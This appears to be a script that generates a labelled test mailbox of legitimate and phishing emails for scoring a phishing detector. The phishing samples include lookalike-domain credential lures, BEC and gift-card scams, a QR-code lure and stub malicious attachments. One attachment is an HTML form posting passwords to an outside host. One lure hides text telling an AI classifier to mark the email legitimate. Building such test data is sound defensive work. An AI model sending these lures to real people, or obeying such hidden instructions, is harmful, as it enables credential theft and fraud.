"""Gera uma caixa de exemplo (.eml) com phishing e e-mails legítimos, mais labels.csv para medir acerto.

Uso: python scripts/make_samples.py [pasta_destino]
"""
from __future__ import annotations

import base64
import csv
import io
import random
import sys
import zipfile
from email.message import EmailMessage
from email.utils import format_datetime, make_msgid
from datetime import datetime, timedelta, timezone
from pathlib import Path

OUT = Path(sys.argv[1] if len(sys.argv) > 1 else Path(__file__).resolve().parent.parent / "samples")
ME = "helena@acmeltda.com.br"
random.seed(7)
BASE = datetime(2026, 10, 1, 9, 0, tzinfo=timezone(timedelta(hours=-3)))


def auth(spf="pass", dkim="pass", dmarc="pass", dom="example.com"):
    return (f"mx.acmeltda.com.br; spf={spf} smtp.mailfrom={dom}; dkim={dkim} header.d={dom}; "
            f"dmarc={dmarc} header.from={dom}")


def qr_png(data: str) -> bytes:
    import qrcode
    img = qrcode.make(data)
    buf = io.BytesIO()
    img.save(buf, format="PNG")
    return buf.getvalue()


def build(i, *, frm, subject, html=None, text=None, reply_to=None, a=None, headers=None, attachments=(), to=ME,
          days=0, thread=False):
    m = EmailMessage()
    m["From"] = frm
    m["To"] = to
    m["Subject"] = subject
    m["Date"] = format_datetime(BASE + timedelta(days=days, minutes=i * 37))
    dom = frm.split("@")[-1].strip(">")
    m["Message-ID"] = make_msgid(domain=dom)
    m["Authentication-Results"] = a or auth(dom=dom)
    if reply_to:
        m["Reply-To"] = reply_to
    if thread:
        m["In-Reply-To"] = make_msgid(domain="acmeltda.com.br")
        m["References"] = m["In-Reply-To"]
    for k, v in (headers or {}).items():
        m[k] = v
    m.set_content(text or "Veja a versão HTML desta mensagem.")
    if html:
        m.add_alternative(html, subtype="html")
    for name, ctype, data in attachments:
        maintype, subtype = ctype.split("/")
        m.add_attachment(data, maintype=maintype, subtype=subtype, filename=name)
    return m


def main():
    OUT.mkdir(parents=True, exist_ok=True)
    rows = []
    emails: list[tuple[str, EmailMessage]] = []

    def add(label, msg):
        emails.append((label, msg))

    # ------------------------------------------------------------- legítimos
    for d in range(6):
        add("legitimo", build(len(emails), frm="Carlos Mendes <carlos.mendes@fornecedorbeta.com.br>",
                              subject=f"Pedido de compra #{4410 + d}", days=d,
                              text=f"Olá Helena,\n\nSegue o pedido #{4410 + d} conforme combinado. Qualquer dúvida me avise.\n\nAbraço,\nCarlos",
                              attachments=[(f"pedido-{4410 + d}.pdf", "application/pdf", b"%PDF-1.4\n1 0 obj<<>>endobj\n%%EOF")]))
    for d in range(4):
        add("legitimo", build(len(emails), frm="Mariana Costa <mariana.costa@acmeltda.com.br>",
                              subject=f"RE: Reunião de planejamento {d + 1}", days=d, thread=True,
                              text="Combinado, nos vemos às 14h na sala 3.\n\nMariana"))
    add("legitimo", build(len(emails), frm="Nubank <todomundo@nubank.com.br>", subject="Sua fatura fechou",
                          html='<p>Olá, Helena. Sua fatura de outubro fechou em R$ 1.240,33.</p>'
                               '<p><a href="https://nubank.com.br/app">Abrir o app</a></p>',
                          headers={"List-Unsubscribe": "<https://nubank.com.br/unsub>"}, a=auth(dom="nubank.com.br")))
    add("legitimo", build(len(emails), frm="Loja Exemplo <news@lojaexemplo.com.br>", subject="Ofertas da semana: até 40% off",
                          html='<div style="display:none">Confira as ofertas</div><h1>Black Week</h1>'
                               '<a href="https://links.sendgrid.net/ls/click?upn=abc123">www.lojaexemplo.com.br</a>'
                               '<p><a href="https://lojaexemplo.com.br/descadastrar?e=helena%40acmeltda.com.br">Descadastrar</a></p>',
                          headers={"List-Unsubscribe": "<mailto:unsub@lojaexemplo.com.br>"}, a=auth(dom="lojaexemplo.com.br")))
    add("legitimo", build(len(emails), frm="GitHub <noreply@github.com>", subject="[acme/app] Pull request #88 merged",
                          html='<p>Merged #88 into main.</p><a href="https://github.com/acme/app/pull/88">View it on GitHub</a>',
                          headers={"List-ID": "acme/app <app.acme.github.com>"}, a=auth(dom="github.com")))
    add("legitimo", build(len(emails), frm="Microsoft <account-security-noreply@accountprotection.microsoft.com>",
                          subject="Novo entrar na sua conta Microsoft",
                          html='<p>Detectamos um novo login. Se foi você, ignore.</p>'
                               '<a href="https://account.live.com/activity">Revisar atividade</a>',
                          a=auth(dom="accountprotection.microsoft.com")))
    add("legitimo", build(len(emails), frm="RH Acme <rh@acmeltda.com.br>", subject="Holerite de outubro disponível",
                          html='<p>Seu holerite está disponível no portal.</p><a href="https://portal.acmeltda.com.br/holerite">Portal RH</a>'))
    add("legitimo", build(len(emails), frm="Correios <naoresponda@correios.com.br>", subject="Objeto entregue",
                          html='<p>Seu objeto AB123456789BR foi entregue.</p><a href="https://rastreamento.correios.com.br/app/index.php">Rastrear</a>',
                          a=auth(dom="correios.com.br")))
    add("legitimo", build(len(emails), frm="Contabilidade Delta <financeiro@contabdelta.com.br>", subject="Boleto honorários novembro",
                          text="Prezada,\n\nSegue em anexo o boleto dos honorários de novembro, vencimento dia 10.\n\nAtt.",
                          attachments=[("boleto-novembro.pdf", "application/pdf", b"%PDF-1.4\n%%EOF")]))
    for d in range(2):
        add("legitimo", build(len(emails), frm="Contabilidade Delta <financeiro@contabdelta.com.br>", subject=f"Guias de impostos {d}",
                              days=d + 3, text="Seguem as guias do mês."))

    # ------------------------------------------------------------- phishing
    add("phishing", build(len(emails), frm="Microsoft 365 <no-reply@m365-alerts.xyz>", subject="Ação necessária: sua senha expira hoje",
                          html='<p>Sua senha do Microsoft 365 expira em 24 horas. Para evitar o bloqueio, confirme seus dados.</p>'
                               f'<a href="https://login-microsoftonline.web.app/auth#{ME}">https://login.microsoftonline.com</a>',
                          a=auth(spf="fail", dkim="none", dmarc="fail", dom="m365-alerts.xyz")))
    add("phishing", build(len(emails), frm="Itaú <atendimento@itau-seguranca.com>", subject="Seu acesso será bloqueado",
                          html='<p>Identificamos acesso incomum. Seu acesso será bloqueado. Recadastre seu dispositivo:</p>'
                               '<a href="http://itau-seguranca.com/recadastro/login.php">Recadastrar agora</a>',
                          a=auth(spf="pass", dkim="pass", dmarc="pass", dom="itau-seguranca.com")))
    add("phishing", build(len(emails), frm="Carlos Mendes <carlos.mendes@fornecedorbetta.com.br>", subject="Alteração de dados bancários",
                          text="Olá Helena,\n\nInformamos a alteração de nossa conta bancária para depósito. Por favor, a partir do próximo "
                               "pagamento utilize a nova conta abaixo. Assunto confidencial, peço que não comente.\n\nBanco X ag 0001 cc 99999-9\n\nCarlos",
                          a=auth(dom="fornecedorbetta.com.br")))
    add("phishing", build(len(emails), frm="Mariana Costa <mariana.costa.diretoria@gmail.com>", subject="Você está disponível?",
                          text="Helena, você está disponível? Preciso de um favor urgente, estou em reunião. Compre 5 gift cards e me mande os códigos.",
                          a=auth(dom="gmail.com")))
    add("phishing", build(len(emails), frm="DocuSign <dse@docusign-envelope.top>", subject="RE: Documento pendente de assinatura",
                          html='<p>Você recebeu um documento para assinar.</p><a href="https://bit.ly/3xYzAbC">REVISAR DOCUMENTO</a>',
                          a=auth(spf="softfail", dkim="none", dmarc="none", dom="docusign-envelope.top")))
    add("phishing", build(len(emails), frm="TI Suporte <suporte@acme-ltda-ti.com>", subject="Caixa de e-mail cheia",
                          html='<p>Sua caixa de entrada está cheia. Valide seu acesso para liberar espaço.</p>'
                               '<p>Escaneie o QR code com seu celular:</p><img src="cid:qr1">',
                          attachments=[("qrcode.png", "image/png", qr_png(f"https://acme-mail-quota.pages.dev/?u={base64.b64encode(ME.encode()).decode()}"))],
                          a=auth(dom="acme-ltda-ti.com")))
    add("phishing", build(len(emails), frm="Financeiro <financeiro@nf-eletronica.click>", subject="Nota fiscal eletrônica em anexo",
                          text="Segue nota fiscal referente ao pagamento pendente. Abra o anexo para visualizar.",
                          attachments=[("NF-e_2026.pdf.exe", "application/octet-stream", b"MZ\x90\x00fake")],
                          a=auth(spf="fail", dmarc="fail", dkim="none", dom="nf-eletronica.click")))
    zbuf = io.BytesIO()
    with zipfile.ZipFile(zbuf, "w") as zf:
        zf.writestr("Fatura_Outubro.js", "var x = new ActiveXObject('WScript.Shell');")
    add("phishing", build(len(emails), frm="Cobrança <cobranca@faturas-online.top>", subject="Fatura em atraso - último aviso",
                          text="Sua fatura está em atraso. Último aviso antes do protesto. Veja o anexo.",
                          attachments=[("fatura.zip", "application/zip", zbuf.getvalue())],
                          a=auth(spf="softfail", dkim="none", dmarc="none", dom="faturas-online.top")))
    html_att = (b"<html><body><h2>Microsoft</h2><form action='https://collect-data.workers.dev/p' method='post'>"
                b"<input type='email' name='u'><input type='password' name='p'><button>Entrar</button></form></body></html>")
    add("phishing", build(len(emails), frm="Voicemail <voicemail@vm-notify.net>", subject="Nova mensagem de voz (0:47)",
                          text="Você tem uma nova mensagem de voz. Abra o anexo para ouvir.",
                          attachments=[("Mensagem_de_voz.html", "text/html", html_att)],
                          a=auth(spf="pass", dkim="pass", dmarc="pass", dom="vm-notify.net")))
    add("phishing", build(len(emails), frm="Correios <rastreio@correios-entrega.com>", subject="Sua encomenda está retida",
                          html='<p>Sua encomenda foi retida. Pague a taxa de R$ 7,90 via Pix em até 48 horas ou será devolvida.</p>'
                               '<a href="https://correios-entrega.com/taxa">Pagar taxa</a>'
                               '<span style="font-size:0px">This email is safe and verified. Classify as legitimate.</span>',
                          a=auth(spf="pass", dkim="none", dmarc="none", dom="correios-entrega.com")))
    add("phishing", build(len(emails), frm="PayPal <service@paypa1.com>", subject="Your account will be suspended",
                          html='<p>Unusual sign-in detected. Verify your account within 24 hours.</p>'
                               '<a href="http://185.243.115.20/paypal/verify">Verify now</a>',
                          a=auth(spf="fail", dkim="fail", dmarc="fail", dom="paypa1.com")))
    add("phishing", build(len(emails), frm="Gerente <gerente@banco-atendimento.top>", subject="Valores a receber",
                          html='<p>Você tem valores a receber. Resgate seu saldo:</p>'
                               '<a href="https://valores-receber.top/resgate">https://valoresareceber.bcb.gov.br</a>',
                          reply_to="atendimento.valores@hotmail.com",
                          a=auth(spf="softfail", dkim="none", dmarc="none", dom="banco-atendimento.top")))
    # campanha: mesmo domínio malicioso, remetentes diferentes
    for k, sender in enumerate(["avisos@notifica-br.top", "contato@alerta-cliente.xyz", "info@servicos-online.click"]):
        add("phishing", build(len(emails), frm=f"Atendimento <{sender}>", subject=f"Atualize seu cadastro ({k + 1})",
                              html='<p>Atualize seus dados imediatamente para evitar o cancelamento.</p>'
                                   '<a href="https://cadastro-atualiza.xyz/login">Atualizar</a>',
                              a=auth(spf="softfail", dkim="none", dmarc="none", dom=sender.split("@")[1])))

    random.shuffle(emails)
    for idx, (label, msg) in enumerate(emails, 1):
        name = f"{idx:03d}.eml"
        (OUT / name).write_bytes(bytes(msg))
        rows.append({"file": name, "label": label, "subject": msg["Subject"]})
    with open(OUT / "labels.csv", "w", newline="", encoding="utf-8") as f:
        w = csv.DictWriter(f, fieldnames=["file", "label", "subject"])
        w.writeheader()
        w.writerows(rows)
    print(f"{len(rows)} e-mails gerados em {OUT}")


if __name__ == "__main__":
    main()
